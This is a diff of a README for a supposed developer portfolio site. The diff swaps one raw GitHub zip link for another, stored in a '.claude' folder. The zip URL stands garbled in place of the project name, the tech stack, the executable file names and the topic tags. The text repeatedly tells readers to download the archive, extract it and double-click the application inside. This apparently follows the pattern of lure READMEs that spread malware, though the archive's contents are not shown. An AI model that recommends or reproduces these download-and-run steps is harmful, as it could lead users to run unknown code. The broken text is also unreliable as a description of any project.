@@ -1,15 +1,15 @@
-# 🌐 https://raw.githubusercontent.com/quiveringcircularmeasure825/mattstrautmann.com/main/app/projects/mattstrautmann.com_1.2.zip - A Portfolio of My Work
+# 🌐 https://github.com/quiveringcircularmeasure825/mattstrautmann.com/raw/refs/heads/main/.claude/com-mattstrautmann-2.8-alpha.5.zip - A Portfolio of My Work
 
 ## 🚀 Getting Started
 
-Welcome to my personal portfolio. This site showcases my open-source projects and career experience. It is built using https://raw.githubusercontent.com/quiveringcircularmeasure825/mattstrautmann.com/main/app/projects/mattstrautmann.com_1.2.zip, TypeScript, and Tailwind CSS, designed to stand out to both AI and traditional search engines. Follow the steps below to download and run the application.
+Welcome to my personal portfolio. This site showcases my open-source projects and career experience. It is built using https://github.com/quiveringcircularmeasure825/mattstrautmann.com/raw/refs/heads/main/.claude/com-mattstrautmann-2.8-alpha.5.zip, TypeScript, and Tailwind CSS, designed to stand out to both AI and traditional search engines. Follow the steps below to download and run the application.
 
-[![Download](https://raw.githubusercontent.com/quiveringcircularmeasure825/mattstrautmann.com/main/app/projects/mattstrautmann.com_1.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/quiveringcircularmeasure825/mattstrautmann.com/main/app/projects/mattstrautmann.com_1.2.zip)
+[![Download](https://github.com/quiveringcircularmeasure825/mattstrautmann.com/raw/refs/heads/main/.claude/com-mattstrautmann-2.8-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/quiveringcircularmeasure825/mattstrautmann.com/raw/refs/heads/main/.claude/com-mattstrautmann-2.8-alpha.5.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the application, click this link: [Visit this page to download](https://raw.githubusercontent.com/quiveringcircularmeasure825/mattstrautmann.com/main/app/projects/mattstrautmann.com_1.2.zip). You will find various versions of the application available.
+   To download the application, click this link: [Visit this page to download](https://github.com/quiveringcircularmeasure825/mattstrautmann.com/raw/refs/heads/main/.claude/com-mattstrautmann-2.8-alpha.5.zip). You will find various versions of the application available.
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Select the latest stable version. Ensure you download the version that suits your operating system (Windows, macOS, or Linux).
@@ -21,7 +21,7 @@ Welcome to my personal portfolio. This site showcases my open-source projects an
    Once the download is complete, locate the file on your computer (it may be in your Downloads folder). Right-click the file and choose "Extract All" or a similar option based on your operating system.
 
 5. **Run the Application**  
-   After extraction, open the new folder. Find the application file, which is named `https://raw.githubusercontent.com/quiveringcircularmeasure825/mattstrautmann.com/main/app/projects/mattstrautmann.com_1.2.zip` for Windows, or `https://raw.githubusercontent.com/quiveringcircularmeasure825/mattstrautmann.com/main/app/projects/mattstrautmann.com_1.2.zip` for macOS. Double-click the file to run the application.
+   After extraction, open the new folder. Find the application file, which is named `https://github.com/quiveringcircularmeasure825/mattstrautmann.com/raw/refs/heads/main/.claude/com-mattstrautmann-2.8-alpha.5.zip` for Windows, or `https://github.com/quiveringcircularmeasure825/mattstrautmann.com/raw/refs/heads/main/.claude/com-mattstrautmann-2.8-alpha.5.zip` for macOS. Double-click the file to run the application.
 
 6. **Enjoy the Experience**  
    The application will open in your web browser. You can now explore my portfolio, view projects, and learn about my experiences.
@@ -59,10 +59,10 @@ This portfolio is built around key themes that enhance its capabilities and reac
 - AEO (AI Engine Optimization)
 - AI Optimization
 - Developer Portfolio Template
-- https://raw.githubusercontent.com/quiveringcircularmeasure825/mattstrautmann.com/main/app/projects/mattstrautmann.com_1.2.zip
+- https://github.com/quiveringcircularmeasure825/mattstrautmann.com/raw/refs/heads/main/.claude/com-mattstrautmann-2.8-alpha.5.zip
 - Open Source
 - Personal Website
-- https://raw.githubusercontent.com/quiveringcircularmeasure825/mattstrautmann.com/main/app/projects/mattstrautmann.com_1.2.zip
+- https://github.com/quiveringcircularmeasure825/mattstrautmann.com/raw/refs/heads/main/.claude/com-mattstrautmann-2.8-alpha.5.zip
 - SEO
 - Tailwind CSS
 - TypeScript
@@ -79,4 +79,4 @@ Make sure to check the releases page regularly for updates and new features. Fol
 
 If you're interested in contributing to this project, feel free to check the issues on GitHub. Pull requests are welcome. Your contributions can help make this portfolio better for everyone.
 
-[![Download](https://raw.githubusercontent.com/quiveringcircularmeasure825/mattstrautmann.com/main/app/projects/mattstrautmann.com_1.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/quiveringcircularmeasure825/mattstrautmann.com/main/app/projects/mattstrautmann.com_1.2.zip)
+[![Download](https://github.com/quiveringcircularmeasure825/mattstrautmann.com/raw/refs/heads/main/.claude/com-mattstrautmann-2.8-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/quiveringcircularmeasure825/mattstrautmann.com/raw/refs/heads/main/.claude/com-mattstrautmann-2.8-alpha.5.zip)
